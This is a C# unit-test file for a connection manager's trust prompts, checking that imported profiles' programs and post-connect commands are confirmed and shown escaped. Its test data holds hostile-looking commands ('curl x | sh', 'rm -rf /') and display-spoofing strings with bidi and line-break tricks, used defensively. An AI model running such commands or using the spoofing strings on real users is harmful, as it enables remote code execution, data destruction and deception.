/*
 * Copyright 2026 Julien Bombled
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

using System.IO;
using Heimdall.App.Services;
using Heimdall.App.Services.Handlers;
using Heimdall.App.Services.Import;
using Heimdall.App.Services.PostConnect;
using Heimdall.App.ViewModels;
using Heimdall.App.ViewModels.Dialogs;
using Heimdall.Core.Codecs;
using Heimdall.Core.Configuration;
using Heimdall.Core.Import;
using Heimdall.Core.Localization;
using Heimdall.Core.Models;
using Heimdall.Core.Ssh;
using Heimdall.Core.StateMachine;
using Heimdall.Ssh;
using KnownHostsImporter = Heimdall.App.Services.Import.KnownHostsImporter;

namespace Heimdall.App.Tests;

public sealed class ServerListExecutionTrustTests
{
    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_Confirmed_PersistsExecutionConfirmed()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(true);
        ServerProfileDto storedProfile = CreateLocalShellProfile("local-1");
        await fixture.ConfigManager.SaveServersAsync(new List<ServerProfileDto> { storedProfile });
        ServerProfileDto promptProfile = CreateLocalShellProfile("local-1");

        bool result = await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);
        List<ServerProfileDto> storedProfiles = await fixture.ConfigManager.LoadServersAsync();
        ServerProfileDto stored = Assert.Single(storedProfiles);

        Assert.True(result);
        Assert.True(promptProfile.ExecutionConfirmed);
        Assert.True(stored.ExecutionConfirmed);
        Assert.Equal(1, fixture.DialogService.ConfirmCallCount);
        Assert.Equal("warning", fixture.DialogService.LastSeverity);
        Assert.Contains("evil.exe", fixture.DialogService.LastConfirmMessage, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_Declined_DoesNotPersistExecutionConfirmed()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto storedProfile = CreateLocalShellProfile("local-1");
        await fixture.ConfigManager.SaveServersAsync(new List<ServerProfileDto> { storedProfile });
        ServerProfileDto promptProfile = CreateLocalShellProfile("local-1");

        bool result = await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);
        List<ServerProfileDto> storedProfiles = await fixture.ConfigManager.LoadServersAsync();
        ServerProfileDto stored = Assert.Single(storedProfiles);

        Assert.False(result);
        Assert.False(promptProfile.ExecutionConfirmed);
        Assert.False(stored.ExecutionConfirmed);
        Assert.Equal(1, fixture.DialogService.ConfirmCallCount);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_GeneratedSessionId_PersistsInventoryProfile()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(true);
        ServerProfileDto storedProfile = CreateLocalShellProfile("local-1");
        await fixture.ConfigManager.SaveServersAsync(new List<ServerProfileDto> { storedProfile });

        // Adopted, not written out. The resulting identifier is indistinguishable as text from
        // one an import could carry, and only the act of adopting it says this copy belongs to
        // "local-1" - which is the whole reason an identifier of this shape is no longer decoded
        // on sight.
        ServerProfileDto promptProfile = CreateLocalShellProfile("local-1");
        promptProfile.AdoptSessionIdentity(SessionIdCodec.Create("local-1"));

        bool result = await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);
        List<ServerProfileDto> storedProfiles = await fixture.ConfigManager.LoadServersAsync();
        ServerProfileDto stored = Assert.Single(storedProfiles);

        Assert.True(result);
        Assert.True(promptProfile.ExecutionConfirmed);
        Assert.True(stored.ExecutionConfirmed);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_ImportedIdOfMintedShape_TrustsThatProfileAlone()
    {
        // Both halves of one rule at this site, so it cannot silently become a bare decode
        // again: the identifier above was minted for "local-1" and resolves to it, while this
        // one is a profile in its own right - an import keeps the identifier its file carried -
        // and must not hand execution trust to the profile its prefix names. Both are the same
        // shape; only the mint separates them. The certificate question applies the same rule
        // from another layer, and the two now run the same code.
        await using ServerListExecutionTrustFixture fixture =
            await ServerListExecutionTrustFixture.CreateAsync(true);
        await fixture.ConfigManager.SaveServersAsync(new List<ServerProfileDto>
        {
            CreateLocalShellProfile("local"),
            CreateLocalShellProfile("local_deadbeef"),
        });
        ServerProfileDto promptProfile = CreateLocalShellProfile("local_deadbeef");

        bool result = await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);
        List<ServerProfileDto> storedProfiles = await fixture.ConfigManager.LoadServersAsync();

        Assert.True(result);
        Assert.True(
            storedProfiles
                .Single(profile => string.Equals(profile.Id, "local_deadbeef", StringComparison.Ordinal))
                .ExecutionConfirmed);
        Assert.False(
            storedProfiles
                .Single(profile => string.Equals(profile.Id, "local", StringComparison.Ordinal))
                .ExecutionConfirmed);
    }

    [Fact]
    public async Task ConfirmAndTrustPostConnectAsync_Confirmed_PersistsExecutionConfirmed()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(true);
        ServerProfileDto storedProfile = CreatePostConnectProfile("ssh-1");
        await fixture.ConfigManager.SaveServersAsync(new List<ServerProfileDto> { storedProfile });
        ServerProfileDto promptProfile = CreatePostConnectProfile("ssh-1");

        bool result = await fixture.ViewModel.ConfirmAndTrustPostConnectAsync(promptProfile, 2);
        List<ServerProfileDto> storedProfiles = await fixture.ConfigManager.LoadServersAsync();
        ServerProfileDto stored = Assert.Single(storedProfiles);

        Assert.True(result);
        Assert.True(promptProfile.ExecutionConfirmed);
        Assert.True(stored.ExecutionConfirmed);
        Assert.Equal(1, fixture.DialogService.ConfirmCallCount);
        Assert.Equal("warning", fixture.DialogService.LastSeverity);
        Assert.Contains("2", fixture.DialogService.LastConfirmMessage, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustPostConnectAsync_Declined_DoesNotPersistExecutionConfirmed()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto storedProfile = CreatePostConnectProfile("ssh-1");
        await fixture.ConfigManager.SaveServersAsync(new List<ServerProfileDto> { storedProfile });
        ServerProfileDto promptProfile = CreatePostConnectProfile("ssh-1");

        bool result = await fixture.ViewModel.ConfirmAndTrustPostConnectAsync(promptProfile, 2);
        List<ServerProfileDto> storedProfiles = await fixture.ConfigManager.LoadServersAsync();
        ServerProfileDto stored = Assert.Single(storedProfiles);

        Assert.False(result);
        Assert.False(promptProfile.ExecutionConfirmed);
        Assert.False(stored.ExecutionConfirmed);
        Assert.Equal(1, fixture.DialogService.ConfirmCallCount);
    }

    // P1-01. An imported Citrix profile with an ICA file is confirmed before the shell opens it,
    // and the prompt names that file, not a program it does not run.
    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_CitrixIcaProfile_NamesTheIcaFile()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = new()
        {
            Id = "citrix-1",
            DisplayName = "Imported Citrix",
            ConnectionType = "CITRIX",
            CitrixIcaFilePath = @"C:\Users\me\Downloads\launch.ica"
        };

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        Assert.Contains(
            "\"Imported Citrix\" was imported and will open this Citrix ICA file: C:\\Users\\me\\Downloads\\launch.ica.",
            fixture.DialogService.LastConfirmMessage,
            StringComparison.Ordinal);
        Assert.DoesNotContain("powershell.exe", fixture.DialogService.LastConfirmMessage, StringComparison.Ordinal);
    }

    // The ICA path comes from the file, so a bidi override or a line break in it is written out.
    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_CitrixIcaPathWithControlAndBidi_IsMadeVisible()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = new()
        {
            Id = "citrix-2",
            DisplayName = "Imported Citrix",
            ConnectionType = "CITRIX",
            CitrixIcaFilePath = "C:\\a\u202eb\nc.ica"
        };

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        string message = fixture.DialogService.LastConfirmMessage;
        Assert.DoesNotContain('\u202e', message);
        Assert.DoesNotContain('\n', message);
        Assert.Contains("C:\\a\\u{202e}b\\u{000a}c.ica", message, StringComparison.Ordinal);
    }

    // The gate also counts arguments, working directory and elevation, so the prompt names them.
    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_LocalProfile_NamesArgumentsWorkingDirectoryAndElevation()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreateLocalShellProfile("local-1");
        promptProfile.LocalShellArguments = "-NoProfile -Command evil";
        promptProfile.LocalShellWorkingDirectory = @"C:\Temp\work";
        promptProfile.ElevationMode = ElevationMode.Gsudo;

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        string message = fixture.DialogService.LastConfirmMessage;
        Assert.Contains("evil.exe", message, StringComparison.Ordinal);
        Assert.Contains("-NoProfile -Command evil", message, StringComparison.Ordinal);
        Assert.Contains(@"C:\Temp\work", message, StringComparison.Ordinal);
        Assert.Contains("elevated", message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_LocalProfileWithOnlyExecutable_OmitsUnsetDetails()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(CreateLocalShellProfile("local-1"));

        string message = fixture.DialogService.LastConfirmMessage;
        Assert.DoesNotContain("elevated", message, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("working directory", message, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("arguments", message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_MultiLineArgument_StaysOnItsOwnLineAndKeepsElevationFirst()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreateLocalShellProfile("local-1");
        promptProfile.LocalShellArguments = "-a\nworking directory: C:\\evil\rtab\t";
        promptProfile.ElevationMode = ElevationMode.Gsudo;

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        // The prompt lists rows, so it has line breaks of its own. What must hold is that a value
        // from the profile cannot add one: everything it says stays on the single row it belongs to.
        string message = fixture.DialogService.LastConfirmMessage;
        string valueLine = Assert.Single(Lines(message), line => line.Contains("evil.exe", StringComparison.Ordinal));
        Assert.DoesNotContain(
            Lines(message),
            line => line.StartsWith("working directory", StringComparison.OrdinalIgnoreCase));
        Assert.DoesNotContain("\t", message, StringComparison.Ordinal);
        Assert.Contains("-a\\nworking directory: C:\\evil\\rtab\\t", valueLine, StringComparison.Ordinal);
        Assert.True(
            valueLine.IndexOf("elevated", StringComparison.OrdinalIgnoreCase)
            < valueLine.IndexOf("evil.exe", StringComparison.Ordinal));
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_ArgumentImitatingTheWorkingDirectoryLabel_CannotCloseItsQuotes()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreateLocalShellProfile("local-1");
        promptProfile.LocalShellArguments = "x\"; working directory: \"C:\\good";

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        string message = fixture.DialogService.LastConfirmMessage;
        Assert.Contains("arguments: \"x\\\"; working directory: \\\"C:\\good\"", message, StringComparison.Ordinal);
        Assert.DoesNotContain("working directory: \"C:", message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustPostConnectAsync_ListsEveryCommand()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreatePostConnectProfile("ssh-1");
        promptProfile.PostConnectSteps =
        [
            new PostConnectStep { Enabled = true, Input = "whoami" },
            new PostConnectStep { Enabled = true, Input = "curl x | sh" }
        ];

        await fixture.ViewModel.ConfirmAndTrustPostConnectAsync(promptProfile, 2);

        string message = fixture.DialogService.LastConfirmMessage;
        Assert.Contains("types 2 commands", message, StringComparison.Ordinal);
        Assert.Contains("\"whoami\"", message, StringComparison.Ordinal);
        Assert.Contains("\"curl x | sh\"", message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustPostConnectAsync_ALegacyPostConnectCommand_IsListed()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto legacy = CreatePostConnectProfile("ssh-legacy");
        legacy.PostConnectSteps = [];
        legacy.PostConnectCommand = "uptime";
        await fixture.ConfigManager.SaveServersAsync(new List<ServerProfileDto> { legacy });
        ServerProfileDto loaded = Assert.Single(await fixture.ConfigManager.LoadServersAsync());

        await fixture.ViewModel.ConfirmAndTrustPostConnectAsync(loaded, 1);

        Assert.Contains("\"uptime\"", fixture.DialogService.LastConfirmMessage, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_LocalWithSteps_ListsTheSteps()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreateLocalShellProfile("local-1");
        promptProfile.PostConnectSteps = [new PostConnectStep { Enabled = true, Input = "rm -rf /tmp/x" }];

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        string message = fixture.DialogService.LastConfirmMessage;
        Assert.Contains("evil.exe", message, StringComparison.Ordinal);
        Assert.Contains("\"rm -rf /tmp/x\"", message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustPostConnectAsync_LinkedStep_NamesTitleAndEscapedParameters()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreatePostConnectProfile("ssh-1");
        promptProfile.PostConnectSteps =
        [
            new PostConnectStep
            {
                Enabled = true,
                CommandLibraryId = "tail-log",
                CommandLibraryParams = new Dictionary<string, string> { ["file"] = "a\"b\\" }
            }
        ];
        Dictionary<string, string> titles = new() { ["tail-log"] = "Tail a log" };

        await fixture.ViewModel.ConfirmAndTrustPostConnectAsync(promptProfile, 1, titles);

        Assert.Contains(
            "\"Tail a log\" into the session after login, with: file = \"a\\\"b\\\\\"",
            fixture.DialogService.LastConfirmMessage,
            StringComparison.Ordinal);
        Assert.DoesNotContain("tail-log", fixture.DialogService.LastConfirmMessage, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustPostConnectAsync_StepWithBreakBidiZeroWidth_StaysOnItsRow()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto plain = CreatePostConnectProfile("ssh-1");
        plain.PostConnectSteps = [new PostConnectStep { Enabled = true, Input = "ls" }];
        await fixture.ViewModel.ConfirmAndTrustPostConnectAsync(plain, 1);
        int plainLineCount = Lines(fixture.DialogService.LastConfirmMessage).Length;

        ServerProfileDto hostile = CreatePostConnectProfile("ssh-2");
        hostile.PostConnectSteps =
        [
            new PostConnectStep { Enabled = true, Input = "ls\nrm -rf /\r\u2028\u202e\u200b" }
        ];
        await fixture.ViewModel.ConfirmAndTrustPostConnectAsync(hostile, 1);

        string message = fixture.DialogService.LastConfirmMessage;
        Assert.Equal(plainLineCount, Lines(message).Length);
        Assert.DoesNotContain('\u2028', message);
        Assert.DoesNotContain('\u202e', message);
        Assert.DoesNotContain('\u200b', message);
        Assert.Contains("ls\\u{000a}rm -rf /\\u{000d}", message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustPostConnectAsync_FortyStepsAndA4000CharCommand_AllShownWhole()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        const int stepCount = 40;
        const int longCommandLength = 4000;
        string longCommand = new('x', longCommandLength);
        ServerProfileDto promptProfile = CreatePostConnectProfile("ssh-1");
        promptProfile.PostConnectSteps =
        [
            .. Enumerable.Range(0, stepCount)
                .Select(index => new PostConnectStep { Enabled = true, Input = $"cmd-{index}" }),
            new PostConnectStep { Enabled = true, Input = longCommand }
        ];

        await fixture.ViewModel.ConfirmAndTrustPostConnectAsync(promptProfile, stepCount + 1);

        string message = fixture.DialogService.LastConfirmMessage;
        Assert.Contains($"\"{longCommand}\"", message, StringComparison.Ordinal);
        Assert.Contains("\"cmd-0\"", message, StringComparison.Ordinal);
        Assert.Contains($"\"cmd-{stepCount - 1}\"", message, StringComparison.Ordinal);
        Assert.Equal(
            stepCount + 1,
            Lines(message).Count(line => line.StartsWith("Types into the session after login", StringComparison.Ordinal)));
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_ElevationOnly_ListsElevation()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreateLocalShellProfile("local-1");
        promptProfile.LocalShellExecutable = string.Empty;
        promptProfile.ElevationMode = ElevationMode.Gsudo;

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        Assert.Equal(1, fixture.DialogService.ConfirmCallCount);
        Assert.Contains("elevated", fixture.DialogService.LastConfirmMessage, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_UsesLabeledOverloadWithDeclineLabels()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreateLocalShellProfile("local-1");

        bool result = await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        Assert.False(result);
        Assert.Equal(1, fixture.DialogService.LabeledConfirmCallCount);
        Assert.Equal("Allow and run", fixture.DialogService.LastConfirmLabel);
        Assert.Equal("Do not run", fixture.DialogService.LastDeclineLabel);
    }

    [Fact]
    public async Task ConfirmAndTrustPostConnectAsync_UsesLabeledOverloadWithDeclineLabels()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);

        bool result = await fixture.ViewModel.ConfirmAndTrustPostConnectAsync(CreatePostConnectProfile("ssh-1"), 2);

        Assert.False(result);
        Assert.Equal(1, fixture.DialogService.LabeledConfirmCallCount);
        Assert.Equal("Allow and run", fixture.DialogService.LastConfirmLabel);
        Assert.Equal("Do not run", fixture.DialogService.LastDeclineLabel);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_WebCommandTooLong_IsRefusedBeforeAnyQuestion()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(true);
        ServerProfileDto promptProfile = new()
        {
            Id = "web-1",
            DisplayName = "Imported Web",
            ConnectionType = "WEB",
            WebOpenExternally = true,
            WebExternalProgram = "viewer.exe",
            WebExternalArguments = new string('a', WebExternalLaunch.MaxDescribedArgumentsLength + 1)
        };

        bool result = await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        Assert.False(result);
        Assert.False(promptProfile.ExecutionConfirmed);
        Assert.Equal(0, fixture.DialogService.ConfirmCallCount);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_CitrixIcaPathAndPostConnectStep_ListsBothRows()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = new()
        {
            Id = "citrix-3",
            DisplayName = "Imported Citrix",
            ConnectionType = "CITRIX",
            CitrixIcaFilePath = @"C:\Users\me\Downloads\launch.ica",
            PostConnectSteps = [new PostConnectStep { Enabled = true, Input = "whoami" }]
        };

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        string message = fixture.DialogService.LastConfirmMessage;
        Assert.Contains("Opens this Citrix ICA file: C:\\Users\\me\\Downloads\\launch.ica", message, StringComparison.Ordinal);
        Assert.Contains("\"whoami\"", message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_CitrixIcaPathOnly_UsesLabeledOverloadWithDeclineLabels()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = new()
        {
            Id = "citrix-4",
            DisplayName = "Imported Citrix",
            ConnectionType = "CITRIX",
            CitrixIcaFilePath = @"C:\Users\me\Downloads\launch.ica"
        };

        bool result = await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        Assert.False(result);
        Assert.Equal(1, fixture.DialogService.LabeledConfirmCallCount);
        Assert.Equal("Allow and run", fixture.DialogService.LastConfirmLabel);
        Assert.Equal("Do not run", fixture.DialogService.LastDeclineLabel);
    }

    [Fact]
    public async Task ConfirmSharedPostConnectAsync_UsesLabeledOverloadWithDeclineLabels()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);

        bool result = await fixture.ViewModel.ConfirmSharedPostConnectAsync(CreatePostConnectProfile("shared-1"), 2);

        Assert.False(result);
        Assert.Equal(1, fixture.DialogService.LabeledConfirmCallCount);
        Assert.Equal("Allow and run", fixture.DialogService.LastConfirmLabel);
        Assert.Equal("Do not run", fixture.DialogService.LastDeclineLabel);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_DisplayNameWithLineBreakAndQuote_AddsNoLineAndCannotCloseQuote()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        const string hostileName = "Backup\" is trusted. Only the program shown below runs, and only once (\"\nStarts on this computer: harmless.exe\\";

        // The list body.
        ServerProfileDto plainLocal = CreateLocalShellProfile("local-1");
        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(plainLocal);
        int plainLocalLineCount = Lines(fixture.DialogService.LastConfirmMessage).Length;
        ServerProfileDto hostileLocal = CreateLocalShellProfile("local-2");
        hostileLocal.DisplayName = hostileName;
        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(hostileLocal);
        string listMessage = fixture.DialogService.LastConfirmMessage;

        Assert.Equal(plainLocalLineCount, Lines(listMessage).Length);
        Assert.Contains("Backup\\\" is trusted.", listMessage, StringComparison.Ordinal);
        Assert.DoesNotContain("Backup\" is trusted", listMessage, StringComparison.Ordinal);

        // The single-sentence Citrix body.
        ServerProfileDto plainIca = CreateIcaProfile("citrix-1");
        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(plainIca);
        int plainIcaLineCount = Lines(fixture.DialogService.LastConfirmMessage).Length;
        ServerProfileDto hostileIca = CreateIcaProfile("citrix-2");
        hostileIca.DisplayName = hostileName;
        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(hostileIca);
        string icaMessage = fixture.DialogService.LastConfirmMessage;

        Assert.Equal(plainIcaLineCount, Lines(icaMessage).Length);
        Assert.Contains("Backup\\\" is trusted.", icaMessage, StringComparison.Ordinal);
        Assert.DoesNotContain("Backup\" is trusted", icaMessage, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_CitrixIcaPathAndLinkedStepOnly_ListsBothRows()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreateIcaProfile("citrix-1");
        promptProfile.PostConnectSteps = [new PostConnectStep { Enabled = true, CommandLibraryId = "tail-log" }];

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        string message = fixture.DialogService.LastConfirmMessage;
        Assert.Contains("Opens this Citrix ICA file:", message, StringComparison.Ordinal);
        Assert.Contains("\"tail-log\"", message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_CitrixIcaPathAndDisabledStep_UsesSingleSentence()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreateIcaProfile("citrix-1");
        promptProfile.PostConnectSteps = [new PostConnectStep { Enabled = false, Input = "whoami" }];

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        string message = fixture.DialogService.LastConfirmMessage;
        Assert.Contains("was imported and will open this Citrix ICA file", message, StringComparison.Ordinal);
        Assert.DoesNotContain("whoami", message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_CitrixIcaPathAndUnmigratedLegacyCommand_ListsBothRows()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreateIcaProfile("citrix-1");
        promptProfile.PostConnectCommand = "uptime";

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        string message = fixture.DialogService.LastConfirmMessage;
        Assert.Contains("Opens this Citrix ICA file:", message, StringComparison.Ordinal);
        Assert.Contains("\"uptime\"", message, StringComparison.Ordinal);
        Assert.Equal("uptime", promptProfile.PostConnectCommand);
    }

    [Fact]
    public async Task ConfirmAndTrustPostConnectAsync_UnmigratedLegacyCommand_IsListed()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreatePostConnectProfile("ssh-1");
        promptProfile.PostConnectSteps = [];
        promptProfile.PostConnectCommand = "uptime";

        await fixture.ViewModel.ConfirmAndTrustPostConnectAsync(promptProfile, 1);

        Assert.Contains("\"uptime\"", fixture.DialogService.LastConfirmMessage, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustPostConnectAsync_BlankDisabledAndLinkedSteps_CountEqualsListedRows()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreatePostConnectProfile("ssh-1");
        promptProfile.PostConnectSteps =
        [
            new PostConnectStep { Enabled = true, Input = "   " },
            new PostConnectStep { Enabled = false, Input = "disabled-one" },
            new PostConnectStep { Enabled = true, CommandLibraryId = "tail-log" },
            new PostConnectStep { Enabled = true, Input = "literal-one" },
            new PostConnectStep { Enabled = true, CommandLibraryId = " ", Input = "literal-two" }
        ];
        int count = promptProfile.PostConnectSteps.Count(step =>
            step.Enabled
            && (!string.IsNullOrWhiteSpace(step.Input) || !string.IsNullOrWhiteSpace(step.CommandLibraryId)));

        await fixture.ViewModel.ConfirmAndTrustPostConnectAsync(promptProfile, count);

        string message = fixture.DialogService.LastConfirmMessage;
        int rows = Lines(message).Count(line =>
            line.StartsWith("Types into the session after login", StringComparison.Ordinal)
            || line.StartsWith("Types the Command Library entry", StringComparison.Ordinal));
        Assert.Equal(3, count);
        Assert.Equal(count, rows);
        Assert.Contains($"types {count} commands", message, StringComparison.Ordinal);
        Assert.DoesNotContain("disabled-one", message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_NullPostConnectSteps_DoesNotThrow()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(false);
        ServerProfileDto promptProfile = CreateLocalShellProfile("local-1");
        promptProfile.PostConnectSteps = null!;

        await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);

        Assert.Contains("evil.exe", fixture.DialogService.LastConfirmMessage, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ConfirmAndTrustExecutionAsync_StoredProfileChangedBeforeAnswer_DoesNotPersist()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(true);
        ServerProfileDto stored = CreateLocalShellProfile("local-1");
        stored.LocalShellArguments = "--changed-after-the-question";
        await fixture.ConfigManager.SaveServersAsync(new List<ServerProfileDto> { stored });
        ServerProfileDto promptProfile = CreateLocalShellProfile("local-1");

        bool result = await fixture.ViewModel.ConfirmAndTrustExecutionAsync(promptProfile);
        ServerProfileDto reloaded = Assert.Single(await fixture.ConfigManager.LoadServersAsync());

        // The connection just allowed proceeds with what was shown; the next connect asks again.
        Assert.True(result);
        Assert.True(promptProfile.ExecutionConfirmed);
        Assert.False(reloaded.ExecutionConfirmed);
    }

    [Fact]
    public async Task ConfirmAndTrustPostConnectAsync_StoredStepsChangedBeforeAnswer_DoesNotPersist()
    {
        await using ServerListExecutionTrustFixture fixture = await ServerListExecutionTrustFixture.CreateAsync(true);
        ServerProfileDto stored = CreatePostConnectProfile("ssh-1");
        stored.PostConnectSteps = [new PostConnectStep { Enabled = true, Input = "curl x | sh" }];
        await fixture.ConfigManager.SaveServersAsync(new List<ServerProfileDto> { stored });
        ServerProfileDto promptProfile = CreatePostConnectProfile("ssh-1");

        bool result = await fixture.ViewModel.ConfirmAndTrustPostConnectAsync(promptProfile, 2);
        ServerProfileDto reloaded = Assert.Single(await fixture.ConfigManager.LoadServersAsync());

        Assert.True(result);
        Assert.False(reloaded.ExecutionConfirmed);
    }

    private static ServerProfileDto CreateIcaProfile(string id) => new()
    {
        Id = id,
        DisplayName = "Imported Citrix",
        ConnectionType = "CITRIX",
        CitrixIcaFilePath = @"C:\Users\me\Downloads\launch.ica"
    };

    private static string[] Lines(string message) => message.Split(["\r\n", "\n", "\r"], StringSplitOptions.None);

    private static ServerProfileDto CreateLocalShellProfile(string id)
    {
        return new ServerProfileDto
        {
            Id = id,
            DisplayName = "Imported Local",
            RemoteServer = "localhost",
            ConnectionType = "LOCAL",
            LocalShellExecutable = "evil.exe"
        };
    }

